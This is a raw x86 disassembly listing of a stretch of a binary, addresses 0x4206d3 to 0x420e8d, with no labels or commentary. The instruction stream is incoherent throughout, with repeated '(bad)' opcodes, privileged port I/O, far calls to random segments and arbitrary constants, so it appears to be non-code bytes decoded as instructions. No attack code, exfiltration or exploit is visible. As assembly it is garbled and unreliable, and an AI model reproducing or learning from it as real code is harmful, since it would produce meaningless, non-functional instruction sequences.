  4206d3:	add    BYTE PTR [edi+ebx*8-0x37],0x20
  4206d8:	cld    
  4206d9:	(bad)  
  4206da:	xchg   ebp,eax
  4206db:	jne    0x4206c9
  4206dd:	push   ss
  4206de:	xor    eax,DWORD PTR [esi+0x69]
  4206e1:	xlat   BYTE PTR ds:[ebx]
  4206e2:	add    al,0xf6
  4206e4:	and    eax,0x94735dde
  4206e9:	test   al,0xd4
  4206eb:	xor    esi,DWORD PTR [ebx]
  4206ed:	pop    ds
  4206ee:	jo     0x4206e4
  4206f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206f1:	stos   BYTE PTR es:[edi],al
  4206f2:	push   esp
  4206f3:	pop    es
  4206f4:	test   cl,0xf1
  4206f7:	or     al,0x5
  4206f9:	setbe  BYTE PTR [edi-0x63d6cfc7]
  420700:	into   
  420701:	mov    esp,0x28b717b0
  420707:	cmp    al,0x86
  420709:	out    0xe,al
  42070b:	and    ch,BYTE PTR [edx+0x5a]
  42070e:	xchg   edx,eax
  42070f:	lock dec edx
  420711:	and    DWORD PTR [esi+0xd],0xe0b920bc
  420718:	and    DWORD PTR [ecx+0x4d],esi
  42071b:	in     al,dx
  42071c:	jne    0x42077b
  42071e:	mov    eax,ds:0xf599289c
  420723:	out    dx,eax
  420724:	lods   al,BYTE PTR ds:[esi]
  420725:	lds    edx,FWORD PTR [esi]
  420727:	pop    esp
  420728:	dec    ecx
  420729:	fst    DWORD PTR [eax]
  42072b:	sub    eax,0x8e1d04d2
  420730:	adc    DWORD PTR [esi+0x56],edi
  420733:	sbb    edx,DWORD PTR [eax+0x5d]
  420736:	push   ebx
  420737:	add    al,0xae
  420739:	sbb    DWORD PTR [eax+edx*4-0x65c816f7],eax
  420740:	mov    ds:0x3d6e2e10,al
  420745:	outs   dx,BYTE PTR ds:[esi]
  420746:	mov    bl,0xc1
  420748:	cmc    
  420749:	adc    dh,0xc4
  42074c:	xchg   esp,ebx
  42074e:	push   esp
  42074f:	lea    edx,[ecx-0x62]
  420752:	jno    0x42075c
  420754:	push   0x1e
  420756:	sbb    BYTE PTR [esi-0x6d1c753],bl
  42075c:	push   cs
  42075d:	gs sub ebp,0x5a91c111
  420764:	pmulhw mm4,QWORD PTR [esi+0x6ca855ae]
  42076b:	or     dh,BYTE PTR [eax+0x28b8631b]
  420771:	mov    esi,0x4308621d
  420776:	xor    ch,bl
  420778:	ror    DWORD PTR [ecx+0x70],cl
  42077b:	int    0xee
  42077d:	pop    ss
  42077e:	imul   esi,DWORD PTR [ebp+0x4c3d4886],0x20e9b58a
  420788:	pop    esp
  420789:	jl     0x4207d1
  42078b:	mov    esp,0xc75cfc74
  420790:	test   DWORD PTR ds:0x813219a3,esi
  420796:	daa    
  420797:	sahf   
  420798:	add    esi,eax
  42079a:	stos   BYTE PTR es:[edi],al
  42079b:	adc    eax,0x8ed275fd
  4207a0:	outs   dx,DWORD PTR ds:[esi]
  4207a1:	or     DWORD PTR [eax],esi
  4207a3:	call   0xb6db83ba
  4207a8:	mov    eax,ds:0x66c66207
  4207ad:	data16 jo 0x420812
  4207b0:	mov    ebx,DWORD PTR [edi]
  4207b2:	cmp    bh,BYTE PTR [ecx+edx*8-0x6d]
  4207b6:	xor    DWORD PTR [edi+0x50],ecx
  4207b9:	sar    DWORD PTR [eax],cl
  4207bb:	sub    cl,0xac
  4207be:	call   0xdeffc1e4
  4207c3:	or     ah,BYTE PTR [edx-0x3f8d0281]
  4207c9:	sub    dh,BYTE PTR [edx]
  4207cb:	push   ss
  4207cc:	push   ecx
  4207cd:	sub    eax,0xcd2ea54c
  4207d2:	mov    bh,0x33
  4207d4:	inc    ebx
  4207d5:	out    0x5b,al
  4207d7:	(bad)  
  4207d8:	sbb    edi,edx
  4207da:	mov    bl,0xc1
  4207dc:	lock into 
  4207de:	rol    cl,1
  4207e0:	push   edi
  4207e1:	nop
  4207e2:	jno    0x420836
  4207e4:	push   ebp
  4207e5:	mov    ch,0x31
  4207e7:	and    BYTE PTR gs:[ebx-0x71],0x2e
  4207ec:	cmp    al,0x1f
  4207ee:	aad    0x57
  4207f0:	push   0xd8d28355
  4207f5:	xor    ecx,esp
  4207f7:	retf   
  4207f8:	pop    edx
  4207f9:	push   ecx
  4207fa:	nop
  4207fb:	sar    BYTE PTR [esi+ecx*8+0x13c3609c],0xf1
  420803:	bound  eax,QWORD PTR [edi+eax*2-0x25]
  420807:	jmp    0x4207bd
  420809:	loopne 0x4207c7
  42080b:	pushaw 
  42080d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42080e:	shr    DWORD PTR [ecx+0x71],1
  420811:	scas   eax,DWORD PTR es:[edi]
  420812:	sar    ch,1
  420814:	push   esp
  420815:	mov    dl,0x17
  420817:	(bad)  
  420818:	pop    edx
  420819:	push   ecx
  42081a:	cmp    esp,DWORD PTR [esp+ecx*4]
  42081d:	cmp    eax,0xd904093a
  420822:	(bad)  
  420824:	pop    ebx
  420825:	mov    dh,0x6a
  420827:	inc    esi
  420828:	sub    al,0x49
  42082a:	xchg   esi,eax
  42082b:	adc    BYTE PTR [eax+eiz*4-0x38],cl
  42082f:	sub    BYTE PTR [ebx],bl
  420831:	or     eax,0xc2908431
  420836:	ror    BYTE PTR [esi],0xb8
  420839:	fistp  WORD PTR [esi]
  42083b:	mov    ecx,0xbf71a003
  420840:	rol    ebp,0x83
  420843:	sbb    al,0xd1
  420845:	pop    esi
  420846:	int    0x10
  420848:	addr16 sbb al,0xfd
  42084b:	push   edi
  42084c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42084d:	mov    esi,0x3e09b531
  420852:	xor    al,0x2c
  420854:	inc    ecx
  420855:	jl     0x420874
  420857:	and    esp,esp
  420859:	mov    ds,WORD PTR [ebx+0x6538c3f1]
  42085f:	add    eax,0x950b44f
  420864:	ffreep st(2)
  420866:	call   0xfea843ee
  42086b:	and    BYTE PTR [ebp-0x5003daa5],dl
  420871:	and    al,0xd8
  420873:	pusha  
  420874:	xchg   edx,eax
  420875:	mov    DWORD PTR [ebp+esi*8-0x29],edi
  420879:	pop    edi
  42087a:	pop    esp
  42087b:	mov    ecx,DWORD PTR [ecx-0x68]
  42087e:	or     DWORD PTR [esi],ebx
  420880:	push   esi
  420881:	loopne 0x4208a8
  420883:	(bad)  
  420885:	pop    ebp
  420886:	retf   
  420887:	add    ebx,DWORD PTR [edi+eax*2+0x75a5a178]
  42088e:	jne    0x420847
  420890:	es push ebx
  420892:	mov    ecx,0x2e929531
  420897:	in     al,dx
  420898:	outs   dx,BYTE PTR ds:[esi]
  420899:	ss fmulp st(0),st
  42089c:	imul   ecx,DWORD PTR [eax+ebx*2],0x65acb384
  4208a3:	sbb    ebx,DWORD PTR [esi+0x66]
  4208a6:	cmp    DWORD PTR [edx+0x6d7f6c1c],ebp
  4208ac:	xor    BYTE PTR [edx],0xef
  4208af:	sub    BYTE PTR [eax],cl
  4208b1:	sbb    dh,ch
  4208b3:	cmp    BYTE PTR [eax*2-0x403c9ac0],ch
  4208ba:	xchg   edx,eax
  4208bb:	dec    ecx
  4208bc:	cli    
  4208bd:	xor    BYTE PTR [eax],bh
  4208bf:	lock icebp 
  4208c1:	mov    esp,0x34918d5d
  4208c6:	adc    al,0x22
  4208c8:	xchg   edx,eax
  4208c9:	std    
  4208ca:	fnsave [ecx-0x12]
  4208cd:	mov    eax,0xc1e81a4d
  4208d2:	jns    0x42088c
  4208d4:	sub    ch,cl
  4208d6:	fs test eax,0x32441098
  4208dc:	loop   0x420870
  4208de:	fisub  DWORD PTR [edi+0x45]
  4208e1:	sbb    edi,DWORD PTR [esp+ebx*1]
  4208e4:	ret    0x7564
  4208e7:	es hlt 
  4208e9:	sub    al,0x1a
  4208eb:	cmp    ecx,ebx
  4208ed:	sbb    al,0xc6
  4208ef:	scas   eax,DWORD PTR es:[edi]
  4208f0:	dec    ecx
  4208f1:	cmp    al,0xce
  4208f3:	arpl   ax,sp
  4208f5:	adc    esi,DWORD PTR [ecx+0x3213deb4]
  4208fb:	idiv   DWORD PTR [ebp+0x116bd653]
  420901:	mov    ds:0x7e5d733a,al
  420906:	mov    ch,ch
  420908:	rol    DWORD PTR [esi-0x484e6548],0x42
  42090f:	outs   dx,BYTE PTR ds:[esi]
  420910:	cmp    BYTE PTR [edx],dl
  420912:	xchg   esp,edi
  420914:	pusha  
  420915:	vpsllw xmm7,xmm5,XMMWORD PTR [ebx+0x15]
  42091a:	retf   0xd4a3
  42091d:	pop    ds
  42091e:	in     al,0x10
  420920:	sbb    ch,BYTE PTR cs:[ebx+0xa3]
	...
  42092f:	add    BYTE PTR [eax],al
  420931:	dec    ecx
  420932:	test   eax,0x9df89d38
  420937:	in     eax,dx
  420938:	std    
  420939:	pop    edx
  42093a:	rcr    BYTE PTR [eax+edx*2+0x4c6f93d6],0x19
  420942:	add    DWORD PTR [ecx],0x0
  420945:	stos   DWORD PTR es:[edi],eax
  420946:	add    eax,DWORD PTR [eax]
  420948:	add    BYTE PTR [esi-0x1],cl
  42094b:	cmp    eax,0x7e7d8409
  420950:	jg     0x4209c2
  420952:	cdq    
  420953:	ret    0x7c2
  420956:	add    al,0x71
  420958:	in     eax,0xf9
  42095a:	imul   edx,esp,0x5d
  42095d:	lds    eax,FWORD PTR [esi-0xcc320d1]
  420963:	sub    bl,BYTE PTR [edx+0x3923c4de]
  420969:	test   BYTE PTR ds:0x9eead04a,dh
  42096f:	mov    eax,ds:0xa2baf846
  420974:	cmc    
  420975:	fiadd  DWORD PTR ds:0xa87fee4
  42097b:	mov    edi,0xf920bb2c
  420980:	jnp    0x420911
  420982:	stos   BYTE PTR es:[edi],al
  420983:	xor    dh,BYTE PTR [edi+0x6fd711ba]
  420989:	xchg   edi,eax
  42098a:	mov    DWORD PTR [esi-0x3d],0x9d502147
  420991:	mov    eax,0xc49d18fc
  420996:	xor    BYTE PTR [ebp+0x65],dh
  420999:	pusha  
  42099a:	jbe    0x4209af
  42099c:	xor    eax,0xc9415607
  4209a1:	push   esi
  4209a2:	js     0x4209a2
  4209a4:	jge    0x42094e
  4209a6:	les    ebp,FWORD PTR [edx]
  4209a8:	sub    eax,0x25ace768
  4209ad:	out    dx,eax
  4209ae:	arpl   WORD PTR [edi-0x47],dx
  4209b1:	bound  edx,QWORD PTR [edi]
  4209b3:	jmp    0x42093a
  4209b5:	lods   al,BYTE PTR ds:[esi]
  4209b6:	outs   dx,BYTE PTR ds:[esi]
  4209b7:	mov    bh,0xc7
  4209b9:	lock sub bh,bh
  4209bc:	dec    esp
  4209bd:	dec    edx
  4209be:	rcr    BYTE PTR [eax+ebx*2+0x28],cl
  4209c2:	jno    0x420a1a
  4209c4:	adc    DWORD PTR [esi],ecx
  4209c6:	gs ret 
  4209c8:	int    0x63
  4209ca:	mov    WORD PTR [ecx+0x6976448a],ds
  4209d0:	outs   dx,BYTE PTR ds:[esi]
  4209d1:	cld    
  4209d2:	stc    
  4209d3:	mov    ?,WORD PTR [ecx]
  4209d5:	std    
  4209d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209d7:	pushf  
  4209d8:	and    eax,0x4c5dd758
  4209dd:	push   edx
  4209de:	cmp    eax,0x76668614
  4209e3:	(bad)  
  4209e4:	or     esi,ecx
  4209e6:	pop    ecx
  4209e7:	ficomp DWORD PTR [edi+0x66d890fb]
  4209ed:	or     al,0x3d
  4209ef:	sub    eax,0xb1862778
  4209f4:	push   esp
  4209f5:	imul   esp,DWORD PTR [eax],0x933706c
  4209fb:	inc    ebp
  4209fc:	or     DWORD PTR [edi+ebp*4+0x7a],edi
  420a00:	pop    ss
  420a01:	dec    eax
  420a02:	mov    esi,esi
  420a04:	leave  
  420a05:	out    dx,eax
  420a06:	adc    BYTE PTR [eax],dh
  420a08:	out    0x4f,al
  420a0a:	fisubr DWORD PTR [ebx+0x54c35c27]
  420a10:	lods   al,BYTE PTR ds:[esi]
  420a11:	loopne 0x420a49
  420a13:	gs inc esp
  420a15:	mov    dh,0xce
  420a17:	jnp    0x420a07
  420a19:	inc    edi
  420a1a:	inc    esi
  420a1b:	addr16 xchg edi,eax
  420a1d:	int3   
  420a1e:	add    eax,0xc989cce3
  420a23:	or     dh,BYTE PTR [esi]
  420a25:	xchg   edi,eax
  420a26:	imul   esp,esp,0x45c48fc2
  420a2c:	sbb    DWORD PTR [edx+ebx*4-0x4b],ecx
  420a30:	xchg   esp,eax
  420a31:	push   edx
  420a32:	push   ds
  420a33:	and    BYTE PTR [eax+0x38],dl
  420a36:	xor    DWORD PTR [ecx+0x2b],0xffffffb4
  420a3a:	shl    BYTE PTR [esi+0x627e5c80],1
  420a40:	mov    esi,0x1b1cd3a2
  420a45:	call   0xf78a9e1e
  420a4a:	imul   eax,esi,0xffffffe1
  420a4d:	push   ecx
  420a4e:	cmp    ah,BYTE PTR ds:0x7db03d65
  420a54:	inc    ecx
  420a55:	(bad)  
  420a56:	in     al,0x46
  420a58:	cld    
  420a59:	arpl   WORD PTR [edx+0x6a6fba04],sp
  420a5f:	xor    dl,BYTE PTR gs:[ebp-0x7e]
  420a63:	aam    0x2c
  420a65:	sub    al,0xf9
  420a67:	cs mov al,gs:0xbd4499b0
  420a6e:	jns    0x420a75
  420a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a71:	cmp    BYTE PTR [ebp*4+0x345b0564],cl
  420a78:	jo     0x420a49
  420a7a:	sub    eax,0xb9596da1
  420a7f:	rcr    ecx,1
  420a81:	mov    WORD PTR [edx],fs
  420a83:	xor    BYTE PTR [esi-0x1b],cl
  420a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a87:	mov    dh,0xe7
  420a89:	add    esp,ebx
  420a8b:	jg     0x420ad8
  420a8d:	push   ecx
  420a8e:	xchg   edi,eax
  420a8f:	push   cs
  420a90:	outs   dx,BYTE PTR ds:[esi]
  420a91:	(bad)  
  420a92:	lds    ebx,FWORD PTR [ebp+0x2c]
  420a95:	pop    ecx
  420a96:	jmp    0x420aca
  420a98:	or     ecx,DWORD PTR [ebx+0x7f056654]
  420a9e:	push   edx
  420a9f:	retf   0x4b42
  420aa2:	cld    
  420aa3:	das    
  420aa4:	clc    
  420aa5:	ss push edx
  420aa7:	mov    esp,0xdf2978bf
  420aac:	fisubr DWORD PTR [ebp-0x3ac2ce36]
  420ab2:	mov    ah,dh
  420ab4:	in     eax,dx
  420ab5:	call   0x9edd:0xcf4de190
  420abc:	frstor [ecx+0x4a0d8f6f]
  420ac2:	outs   dx,BYTE PTR ds:[esi]
  420ac3:	xchg   ebp,eax
  420ac4:	jle    0x420b24
  420ac6:	jno    0x420b1b
  420ac8:	xchg   esp,eax
  420ac9:	mov    ecx,0x1cbd9c1b
  420ace:	sub    bl,BYTE PTR [esp+ebx*2+0x16]
  420ad2:	push   0xb3b59de3
  420ad7:	xor    eax,0x4c080045
  420adc:	fsub   st(4),st
  420ade:	adc    al,0xf5
  420ae0:	lods   al,BYTE PTR ds:[esi]
  420ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ae2:	push   0x5
  420ae4:	loopne 0x420aa5
  420ae6:	add    eax,0xe530cca1
  420aeb:	imul   edi,esi,0x798a6075
  420af1:	xchg   DWORD PTR [ebp-0x6dec55f1],esi
  420af7:	test   eax,0x3f49b36f
  420afc:	je     0x420ac9
  420afe:	and    ebp,edi
  420b00:	cwde   
  420b01:	scas   al,BYTE PTR es:[edi]
  420b02:	jecxz  0x420aa5
  420b04:	lahf   
  420b05:	xchg   ebx,eax
  420b06:	ins    BYTE PTR es:[edi],dx
  420b07:	and    DWORD PTR [edi-0x18],0x91f6f9e8
  420b0e:	popf   
  420b0f:	push   ds
  420b10:	dec    edx
  420b11:	and    al,0x14
  420b13:	outs   dx,DWORD PTR gs:[esi]
  420b15:	shl    BYTE PTR [ebx-0x4b],1
  420b18:	dec    edi
  420b19:	mov    bl,0x35
  420b1b:	mov    ds:0x87c99bb3,eax
  420b20:	inc    ebx
  420b21:	jmp    0x5821543c
  420b26:	and    BYTE PTR [ecx],cl
  420b28:	es xchg ebx,eax
  420b2a:	mov    ds:0xc5cca394,al
  420b2f:	mov    ebx,0x99295b1e
  420b34:	sahf   
  420b35:	dec    ebp
  420b36:	dec    edx
  420b37:	fdivr  st,st(7)
  420b39:	or     eax,0x48d62ed
  420b3e:	icebp  
  420b3f:	mov    ebp,0xe77aea81
  420b44:	fadd   DWORD PTR [eax+0x673d3acf]
  420b4a:	stos   BYTE PTR es:[edi],al
  420b4b:	clc    
  420b4c:	xchg   ebp,eax
  420b4d:	stos   DWORD PTR es:[edi],eax
  420b4e:	dec    esi
  420b4f:	xchg   edx,eax
  420b50:	jg     0x420b08
  420b52:	inc    ecx
  420b53:	dec    edi
  420b54:	stc    
  420b55:	call   0x793b:0x8d31891f
  420b5c:	sub    BYTE PTR [esp+eax*1-0xf149b9b],0x69
  420b64:	sahf   
  420b65:	daa    
  420b66:	mov    al,ds:0x75a37f68
  420b6b:	or     bh,BYTE PTR [ebp-0x11a3a13c]
  420b71:	test   al,0x3b
  420b73:	das    
  420b74:	(bad)  
  420b75:	cmc    
  420b76:	outs   dx,DWORD PTR ds:[esi]
  420b77:	mov    bh,0xfa
  420b79:	in     eax,0xdd
  420b7b:	inc    esi
  420b7c:	fwait
  420b7d:	mul    DWORD PTR [eax]
  420b7f:	(bad)  
  420b80:	lods   eax,DWORD PTR ds:[esi]
  420b81:	lahf   
  420b82:	std    
  420b83:	adc    al,0x9e
  420b85:	in     eax,dx
  420b86:	data16 mov ah,0xb6
  420b89:	rcr    DWORD PTR [edi-0x2f],1
  420b8c:	inc    esp
  420b8d:	push   0x105d91ed
  420b92:	call   0x107:0xcf4ae1f3
  420b99:	dec    edi
  420b9a:	sahf   
  420b9b:	bound  ebx,QWORD PTR [edx]
  420b9d:	cdq    
  420b9e:	dec    esp
  420b9f:	adc    esi,edi
  420ba1:	dec    edi
  420ba2:	add    esi,DWORD PTR [ecx]
  420ba4:	pop    ebx
  420ba5:	les    eax,FWORD PTR [esp+edx*2+0x70]
  420ba9:	xor    DWORD PTR [ecx],ecx
  420bab:	bound  ebp,QWORD PTR [ebp+0x52]
  420bae:	(bad)  
  420baf:	cmp    eax,0x13e09a85
  420bb4:	jae    0x420b66
  420bb6:	not    BYTE PTR [edi]
  420bb8:	sbb    dh,BYTE PTR [eax+ecx*8]
  420bbb:	lods   al,BYTE PTR ds:[esi]
  420bbc:	ja     0x420bcd
  420bbe:	mov    ebx,0x10d519a6
  420bc3:	jecxz  0x420b91
  420bc5:	mov    eax,0x4234d9b0
  420bca:	mov    ecx,0x3c33e556
  420bcf:	cdq    
  420bd0:	repnz out dx,eax
  420bd2:	int    0xff
  420bd4:	idiv   DWORD PTR [eax-0x7a498203]
  420bda:	jns    0x420c38
  420bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bdd:	xchg   ecx,eax
  420bde:	clc    
  420bdf:	scas   al,BYTE PTR es:[edi]
  420be0:	das    
  420be1:	retf   0x756b
  420be4:	push   0xb287036c
  420be9:	outs   dx,BYTE PTR ds:[esi]
  420bea:	mov    cl,0x37
  420bec:	shr    BYTE PTR [edx+0x7f],cl
  420bef:	(bad)  
  420bf0:	neg    ch
  420bf2:	xchg   edi,eax
  420bf3:	mov    al,0xdb
  420bf5:	cmp    bl,BYTE PTR ds:0x34165cc4
  420bfb:	jg     0x420bee
  420bfd:	stos   DWORD PTR es:[edi],eax
  420bfe:	jecxz  0x420bd3
  420c00:	adc    cl,ah
  420c02:	pop    ebp
  420c03:	out    0xe0,al
  420c05:	icebp  
  420c06:	retf   0xbcac
  420c09:	dec    ebx
  420c0a:	ret    
  420c0b:	adc    esp,DWORD PTR ds:0x3f11371c
  420c11:	add    al,BYTE PTR [eax]
  420c13:	mov    cs,edi
  420c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c16:	inc    esp
  420c17:	xor    edx,DWORD PTR [ebp-0x14ff4534]
  420c1d:	sbb    eax,0xc68cdb1f
  420c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c23:	jae    0x420bf3
  420c25:	fwait
  420c26:	repnz inc esp
  420c28:	hlt    
  420c29:	jecxz  0x420c34
  420c2b:	fwait
  420c2c:	das    
  420c2d:	push   edi
  420c2e:	ret    0xbf19
  420c31:	add    BYTE PTR [ebx+0x598f6161],al
  420c37:	hlt    
  420c38:	lahf   
  420c39:	stc    
  420c3a:	bound  ebx,QWORD PTR [esi-0x2]
  420c3d:	les    ebp,FWORD PTR [esi]
  420c3f:	ds pop ds
  420c41:	push   0x190efbad
  420c46:	out    dx,al
  420c47:	push   ds
  420c48:	(bad)  [esi+0x6c289950]
  420c4e:	aas    
  420c4f:	out    dx,eax
  420c50:	sahf   
  420c51:	mov    WORD PTR [edx],gs
  420c53:	sbb    bh,0x37
  420c56:	add    DWORD PTR [ebx-0x69],ecx
  420c59:	(bad)  
  420c5a:	rol    BYTE PTR [esi+0x14],0xd8
  420c5e:	repz loop 0x420c1c
  420c61:	fwait
  420c62:	clc    
  420c63:	out    dx,eax
  420c64:	test   al,0x24
  420c66:	or     eax,0x43e9689b
  420c6b:	lods   eax,DWORD PTR ds:[esi]
  420c6c:	ds or  al,0xcc
  420c6f:	inc    esp
  420c70:	repz sbb eax,ebp
  420c73:	or     ebx,DWORD PTR [edi+0x14ac9ed1]
  420c79:	xchg   ebx,eax
  420c7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c7b:	ret    
  420c7c:	pop    es
  420c7d:	sahf   
  420c7e:	pusha  
  420c7f:	stos   BYTE PTR es:[edi],al
  420c80:	icebp  
  420c81:	ins    DWORD PTR es:[edi],dx
  420c82:	loop   0x420cbd
  420c84:	pmullw mm6,QWORD PTR [ebx-0x44680e91]
  420c8b:	xlat   BYTE PTR ds:[ebx]
  420c8c:	cdq    
  420c8d:	jae    0x420cfd
  420c8f:	ror    ebp,cl
  420c91:	cmp    DWORD PTR [esi+eiz*1+0x5f],0xd601f2bc
  420c99:	addr16 (bad) 
  420c9b:	adc    al,0x83
  420c9d:	lods   eax,DWORD PTR ds:[esi]
  420c9e:	js     0x420c38
  420ca0:	cld    
  420ca1:	shr    cl,cl
  420ca3:	mov    al,ds:0xd985b392
  420ca8:	cmp    al,0x63
  420caa:	shl    edx,cl
  420cac:	(bad)
  420cb1:	out    dx,al
  420cb2:	push   esp
  420cb3:	push   ss
  420cb4:	shl    BYTE PTR [edi-0x1b],1
  420cb7:	(bad)  
  420cb8:	daa    
  420cb9:	aad    0x73
  420cbb:	data16 aas 
  420cbd:	mov    bl,0x86
  420cbf:	inc    BYTE PTR [esi]
  420cc1:	inc    esp
  420cc2:	and    DWORD PTR ds:0xda1230d0,0x52b03ece
  420ccc:	sbb    eax,0x15a45078
  420cd1:	pop    esp
  420cd2:	repz mov edx,DWORD PTR [eax-0x62]
  420cd6:	test   BYTE PTR [edx-0x31],ch
  420cd9:	and    BYTE PTR [esi+esi*1],bh
  420cdc:	jl     0x420cbd
  420cde:	jmp    0x420cdf
  420ce0:	in     eax,dx
  420ce1:	push   ecx
  420ce2:	push   edi
  420ce3:	pop    esi
  420ce4:	mov    WORD PTR [esi-0x2c0b5aa8],ds
  420cea:	mov    ds:0xe88058e9,eax
  420cf0:	fwait
  420cf1:	cmp    BYTE PTR [edx+0x11],al
	...
  420cff:	add    BYTE PTR [eax],al
  420d01:	es mov eax,0xbf9f8f0d
  420d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d08:	mov    ecx,0xfe336cff
  420d0d:	cmc    
  420d0e:	aaa    
  420d0f:	pop    esi
  420d10:	out    dx,al
  420d11:	les    eax,FWORD PTR [esi+0x3ab0001]
  420d17:	add    BYTE PTR [eax],al
  420d19:	dec    edx
  420d1a:	or     BYTE PTR ds:0x1c1733c1,bl
  420d20:	(bad)  
  420d21:	dec    DWORD PTR [eax+0x750de7c4]
  420d27:	mov    esi,0xdf69a7ff
  420d2c:	repnz int3 
  420d2e:	mov    dh,0xdf
  420d30:	in     eax,dx
  420d31:	xor    ah,BYTE PTR [edi+0x4821e34a]
  420d37:	push   ecx
  420d38:	lock lods eax,DWORD PTR ds:[esi]
  420d3a:	out    dx,eax
  420d3b:	ins    BYTE PTR es:[edi],dx
  420d3c:	idiv   BYTE PTR [ebx-0x26]
  420d3f:	imul   ebp,ebx,0x982e093c
  420d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d46:	ins    DWORD PTR es:[edi],dx
  420d47:	jbe    0x420cd0
  420d49:	or     ebp,DWORD PTR [edi-0x62]
  420d4c:	push   cs
  420d4d:	cmp    al,0x34
  420d4f:	mov    cl,0xa1
  420d51:	rcl    BYTE PTR [edi],0x25
  420d54:	jnp    0x420daa
  420d56:	pushf  
  420d57:	fwait
  420d58:	push   edx
  420d59:	sbb    DWORD PTR [esi-0x536993c0],edx
  420d5f:	mov    al,ds:0x297194b1
  420d64:	stos   BYTE PTR es:[edi],al
  420d65:	fcomp  QWORD PTR [edi]
  420d67:	shl    BYTE PTR [esi-0x3dcd1fca],cl
  420d6d:	add    edi,edi
  420d6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d70:	fld    DWORD PTR [eax+0x9]
  420d73:	outs   dx,BYTE PTR ds:[esi]
  420d74:	pop    ds
  420d75:	inc    edx
  420d76:	punpckhdq mm5,QWORD PTR [esp+eax*8-0x25003015]
  420d7e:	scas   al,BYTE PTR es:[edi]
  420d7f:	loopne 0x420d5b
  420d81:	jg     0x420d53
  420d83:	sbb    al,0x70
  420d85:	test   ebp,esp
  420d87:	mov    dl,0x5e
  420d89:	(bad)  
  420d8a:	shl    BYTE PTR [eax+edi*1],cl
  420d8d:	out    dx,al
  420d8e:	inc    esp
  420d8f:	nop
  420d90:	not    BYTE PTR [edi+eiz*2]
  420d93:	jmp    0xdc30:0xeae3e248
  420d9a:	outs   dx,DWORD PTR ds:[esi]
  420d9b:	aas    
  420d9c:	neg    BYTE PTR [ecx]
  420d9e:	in     eax,dx
  420d9f:	push   es
  420da0:	and    dl,BYTE PTR [edx+0x5c]
  420da3:	test   bl,0xbc
  420da6:	pop    edx
  420da7:	fucomip st,st(3)
  420da9:	jb     0x420de6
  420dab:	dec    eax
  420dac:	inc    ebx
  420dad:	nop
  420dae:	arpl   WORD PTR ds:0x1526d0be,bp
  420db4:	gs sub ebx,edx
  420db7:	xchg   esp,eax
  420db8:	ret    
  420db9:	leave  
  420dba:	jmp    0x420df1
  420dbc:	mov    DWORD PTR [ebx+0x784c50e6],eax
  420dc2:	mov    ?,eax
  420dc4:	into   
  420dc5:	pusha  
  420dc6:	stos   DWORD PTR es:[edi],eax
  420dc7:	loopne 0x420d5f
  420dc9:	je     0x420dde
  420dcb:	mov    eax,ds:0xcd86ee35
  420dd0:	inc    ecx
  420dd1:	jl     0x420d88
  420dd3:	test   eax,0x150faf0e
  420dd8:	pop    esp
  420dd9:	arpl   WORD PTR [edi-0x1c40fdf],bp
  420ddf:	stos   BYTE PTR es:[edi],al
  420de0:	gs pop ds
  420de2:	leave  
  420de3:	or     esp,DWORD PTR [ecx-0x54]
  420de6:	fmul   QWORD PTR ds:0xf173ae7e
  420dec:	sub    esi,ecx
  420dee:	ret    0xe5fd
  420df1:	lahf   
  420df2:	push   ebp
  420df3:	imul   ebp,DWORD PTR [eax-0x3b495e0e],0xffffff9d
  420dfa:	cld    
  420dfb:	aam    0xde
  420dfd:	mov    ebp,0x71beee56
  420e02:	icebp  
  420e03:	ror    DWORD PTR [edi-0x6736447c],1
  420e09:	push   esp
  420e0a:	cmc    
  420e0b:	push   esi
  420e0c:	jb     0x420df3
  420e0e:	aam    0xab
  420e10:	aas    
  420e11:	mov    ds:0x43274744,al
  420e16:	cmp    eax,0x8a2484fb
  420e1b:	sbb    bh,BYTE PTR [ebx]
  420e1d:	and    eax,0x85fe8fb2
  420e22:	inc    esi
  420e23:	inc    ebx
  420e24:	sub    dh,BYTE PTR [ebx+0x1a5f76c]
  420e2a:	(bad)  
  420e2b:	dec    edx
  420e2c:	mov    ah,0x34
  420e2e:	in     eax,dx
  420e2f:	pop    ecx
  420e30:	cmp    edi,ebx
  420e32:	push   esi
  420e33:	push   esp
  420e34:	mov    bl,0x1e
  420e36:	cmp    al,0x9d
  420e38:	push   esp
  420e39:	dec    edx
  420e3a:	sub    esp,DWORD PTR [edx+0x6b66d577]
  420e40:	inc    esp
  420e41:	add    edx,ebp
  420e43:	ret    0x7bbe
  420e46:	and    BYTE PTR [eax],bh
  420e48:	aad    0xf2
  420e4a:	in     eax,dx
  420e4b:	into   
  420e4c:	test   BYTE PTR [ebx+0x68799d5f],dl
  420e52:	or     eax,0x1da5831e
  420e57:	out    0x7f,eax
  420e59:	mov    eax,0xb886ae2d
  420e5e:	lahf   
  420e5f:	(bad)  
  420e60:	hlt    
  420e61:	stos   BYTE PTR es:[edi],al
  420e62:	pushf  
  420e63:	push   edi
  420e64:	push   0x2e
  420e66:	and    BYTE PTR [ecx-0x6],dl
  420e69:	fild   WORD PTR [esi+0xdb3837d]
  420e6f:	xor    al,0x16
  420e71:	les    esi,FWORD PTR [eax+0x36]
  420e74:	fstp   DWORD PTR ds:0xf8e4906c
  420e7a:	les    esi,FWORD PTR [edx]
  420e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e7d:	and    ebp,DWORD PTR [edx+0x7d534440]
  420e83:	mov    bl,0x34
  420e85:	stc    
  420e86:	iret   
  420e87:	ret    0x1186
  420e8a:	xchg   al,bh
  420e8c:	inc    esp
  420e8d:	xchg   esi,eax
